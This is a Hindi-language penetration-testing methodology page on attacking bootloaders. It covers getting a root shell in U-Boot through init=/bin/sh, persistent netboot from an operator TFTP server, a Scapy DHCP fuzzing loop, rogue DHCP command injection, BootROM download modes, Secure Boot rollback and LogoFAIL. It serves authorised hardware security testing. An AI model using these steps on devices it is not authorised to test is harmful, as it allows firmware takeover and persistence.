# बूटलोडर परीक्षण

{{#include ../../banners/hacktricks-training.md}}

निम्नलिखित चरण डिवाइस के स्टार्टअप कॉन्फ़िगरेशन को बदलने और U-Boot तथा UEFI-class लोडर्स जैसे bootloaders का परीक्षण करने के लिए सुझाए जाते हैं। प्रारंभिक कोड निष्पादन पाने, signature/rollback सुरक्षा का आकलन करने, और recovery या network-boot पाथ्स का दुरुपयोग करने पर ध्यान दें।

Related: MediaTek secure-boot bypass via bl2_ext patching:

{{#ref}}
android-mediatek-secure-boot-bl2_ext-bypass-el3.md
{{#endref}}

## U-Boot quick wins and environment abuse

1. इंटरप्रेटर शेल तक पहुँचें
- बूट के दौरान, `bootcmd` के चलने से पहले किसी ज्ञात ब्रेक की (अक्सर कोई भी की, 0, space, या बोर्ड-विशेष "magic" सिक्वेंस) को दबाकर U-Boot प्रॉम्प्ट में आएं।

2. बूट स्थिति और वेरिएबल्स का निरीक्षण करें
- उपयोगी कमांड्स:
- `printenv` (environment dump)
- `bdinfo` (board info, memory addresses)
- `help bootm; help booti; help bootz` (supported kernel boot methods)
- `help ext4load; help fatload; help tftpboot` (available loaders)

3. रूट शेल पाने के लिए boot arguments बदलें
- `init=/bin/sh` जोड़ें ताकि kernel सामान्य init के बजाय शेल पर जाए:
```
# printenv
# setenv bootargs 'console=ttyS0,115200 root=/dev/mtdblock3 rootfstype=<fstype> init=/bin/sh'
# saveenv
# boot    # or: run bootcmd
```

4. अपने TFTP सर्वर से Netboot करें
- नेटवर्क कॉन्फ़िगर करें और LAN से kernel/fit image लाएं:
```
# setenv ipaddr 192.168.2.2      # device IP
# setenv serverip 192.168.2.1    # TFTP server IP
# saveenv; reset
# ping ${serverip}
# tftpboot ${loadaddr} zImage           # kernel
# tftpboot ${fdt_addr_r} devicetree.dtb # DTB
# setenv bootargs "${bootargs} init=/bin/sh"
# booti ${loadaddr} - ${fdt_addr_r}
```

5. environment के माध्यम से परिवर्तन को स्थायी करें
- यदि env स्टोरेज write-protected नहीं है, तो आप नियंत्रण को स्थायी कर सकते हैं:
```
# setenv bootcmd 'tftpboot ${loadaddr} fit.itb; bootm ${loadaddr}'
# saveenv
```
- `bootcount`, `bootlimit`, `altbootcmd`, `boot_targets` जैसे वेरिएबल्स की जांच करें जो fallback पाथ्स को प्रभावित करते हैं। गलत कॉन्फ़िगर किए गए मान बार-बार शेल में ब्रेक दिला सकते हैं।

6. debug/unsafe सुविधाओं की जाँच करें
- देखें: `bootdelay` > 0, `autoboot` disabled, unrestricted `usb start; fatload usb 0:1 ...`, serial के माध्यम से `loady`/`loads` की क्षमता, removable media से `env import` की अनुमति, और kernels/ramdisks बिना signature checks के लोड होने की स्थितियाँ।

7. U-Boot image/verification परीक्षण
- यदि प्लेटफ़ॉर्म FIT images के साथ secure/verified boot का दावा करता है, तो unsigned और tampered images दोनों आज़माएँ:
```
# tftpboot ${loadaddr} fit-unsigned.itb; bootm ${loadaddr}     # should FAIL if FIT sig enforced
# tftpboot ${loadaddr} fit-signed-badhash.itb; bootm ${loadaddr} # should FAIL
# tftpboot ${loadaddr} fit-signed.itb; bootm ${loadaddr}        # should only boot if key trusted
```
- `CONFIG_FIT_SIGNATURE`/`CONFIG_(SPL_)FIT_SIGNATURE` की अनुपस्थिति या legacy `verify=n` व्यवहार अक्सर arbitrary payloads को बूट करने की अनुमति देता है।

## Network-boot surface (DHCP/PXE) and rogue servers

8. PXE/DHCP पैरामीटर फज़िंग
- U-Boot के legacy BOOTP/DHCP हैंडलिंग में memory-safety मुद्दे रहे हैं। उदाहरण के लिए, CVE‑2024‑42040 crafted DHCP responses के माध्यम से memory disclosure का वर्णन करता है जो U-Boot memory से bytes को वायर पर leak कर सकता है। netboot के दौरान boot parameters को overly long/edge-case मानों (option 67 bootfile-name, vendor options, file/servername fields) के साथ exercise करें और हँग/leak के लिए देखें।
- netboot के दौरान boot पैरामीटर्स को stress करने के लिए Minimal Scapy snippet:
```python
from scapy.all import *
offer = (Ether(dst='ff:ff:ff:ff:ff:ff')/
IP(src='192.168.2.1', dst='255.255.255.255')/
UDP(sport=67, dport=68)/
BOOTP(op=2, yiaddr='192.168.2.2', siaddr='192.168.2.1', chaddr=b'\xaa\xbb\xcc\xdd\xee\xff')/
DHCP(options=[('message-type','offer'),
('server_id','192.168.2.1'),
# Intentionally oversized and strange values
('bootfile_name','A'*300),
('vendor_class_id','B'*240),
'end']))
sendp(offer, iface='eth0', loop=1, inter=0.2)
```
- यह भी जाँचें कि क्या PXE filename फ़ील्ड्स shell/loader लॉजिक को बिना sanitization के पास की जा रही हैं जब इन्हें OS-side provisioning scripts से chained किया जाता है।

9. Rogue DHCP server command injection परीक्षण
- एक rogue DHCP/PXE सर्विस सेटअप करें और filename या options फ़ील्ड्स में characters इंजेक्ट करके boot chain के बाद के चरणों में command interpreters तक पहुँचने की कोशिश करें। Metasploit की DHCP auxiliary, `dnsmasq`, या custom Scapy scripts अच्छे काम करते हैं। पहले लैब नेटवर्क को अलग रखें।

## SoC ROM recovery modes that override normal boot

कई SoC एक BootROM "loader" मोड एक्सपोज़ करते हैं जो USB/UART के माध्यम से कोड स्वीकार करेगा भले ही flash images invalid हों। यदि secure-boot fuses नहीं जलाए गए हैं, तो यह chain में बहुत जल्दी arbitrary code execution प्रदान कर सकता है।

- NXP i.MX (Serial Download Mode)
- Tools: `uuu` (mfgtools3) or `imx-usb-loader`.
- Example: `imx-usb-loader u-boot.imx` से कस्टम U-Boot को RAM में push और run करें।
- Allwinner (FEL)
- Tool: `sunxi-fel`.
- Example: `sunxi-fel -v uboot u-boot-sunxi-with-spl.bin` या `sunxi-fel write 0x4A000000 u-boot-sunxi-with-spl.bin; sunxi-fel exe 0x4A000000`.
- Rockchip (MaskROM)
- Tool: `rkdeveloptool`.
- Example: `rkdeveloptool db loader.bin; rkdeveloptool ul u-boot.bin` से loader stage करें और कस्टम U-Boot upload करें।

जाँच करें कि क्या डिवाइस में secure-boot eFuses/OTP जले हुए हैं। यदि नहीं, तो BootROM download मोड अक्सर किसी भी higher-level verification (U-Boot, kernel, rootfs) को bypass करके आपका first-stage payload सीधे SRAM/DRAM से execute कर देता है।

## UEFI/PC-class bootloaders: quick checks

10. ESP में छेड़छाड़ और rollback परीक्षण
- EFI System Partition (ESP) mount करें और loader components देखें: `EFI/Microsoft/Boot/bootmgfw.efi`, `EFI/BOOT/BOOTX64.efi`, `EFI/ubuntu/shimx64.efi`, `grubx64.efi`, vendor logo paths.
- यदि Secure Boot revocations (dbx) अद्यतन नहीं हैं, तो downgraded या ज्ञात-कमजोर signed boot components के साथ बूट करने की कोशिश करें। यदि प्लेटफ़ॉर्म अभी भी पुराने shims/bootmanagers पर भरोसा करता है, तो आप अक्सर ESP से अपना kernel या `grub.cfg` लोड करके persistence प्राप्त कर सकते हैं।

11. Boot logo parsing बग्स (LogoFAIL class)
- कई OEM/IBV firmware DXE में image-parsing flaws के शिकार थे जो boot logos को process करते हैं। यदि attacker ESP पर vendor-विशेष path (उदा., `\EFI\<vendor>\logo\*.bmp`) पर crafted image रख सकता है और reboot कर सकता है, तो Secure Boot enabled होने पर भी early boot के दौरान code execution संभव हो सकता है। जाँचें कि क्या प्लेटफ़ॉर्म user-supplied logos स्वीकार करता है और क्या वे paths OS से writable हैं।

## Hardware caution

SPI/NAND flash के साथ early boot के दौरान इंटरैक्ट करते समय सतर्क रहें (उदा., reads को bypass करने के लिए pins को ग्राउंड करना) और हमेशा flash datasheet देखें। गलत टाइम किए गए शॉर्टs डिवाइस या programmer को corrupt कर सकते हैं।

## नोट्स और अतिरिक्त सुझाव

- `env export -t ${loadaddr}` और `env import -t ${loadaddr}` आज़माएँ ताकि environment blobs को RAM और storage के बीच मूव किया जा सके; कुछ प्लेटफ़ॉर्म removable media से बिना authentication के env import करने की अनुमति देते हैं।
- Linux-आधारित सिस्टमों पर जो `extlinux.conf` के माध्यम से बूट होते हैं, boot partition में `APPEND` line (जैसे `init=/bin/sh` या `rd.break` इंजेक्ट करना) अक्सर पर्याप्त होता है जब signature checks लागू नहीं होते।
- यदि userland `fw_printenv/fw_setenv` देता है, तो सत्यापित करें कि `/etc/fw_env.config` वास्तविक env स्टोरेज से मेल खाता है। गलत कॉन्फ़िगर किए गए offsets आपको गलत MTD region पढ़ने/लिखने देते हैं।

## References

- [https://scriptingxss.gitbook.io/firmware-security-testing-methodology/](https://scriptingxss.gitbook.io/firmware-security-testing-methodology/)
- [https://www.binarly.io/blog/finding-logofail-the-dangers-of-image-parsing-during-system-boot](https://www.binarly.io/blog/finding-logofail-the-dangers-of-image-parsing-during-system-boot)
- [https://nvd.nist.gov/vuln/detail/CVE-2024-42040](https://nvd.nist.gov/vuln/detail/CVE-2024-42040)

{{#include ../../banners/hacktricks-training.md}}
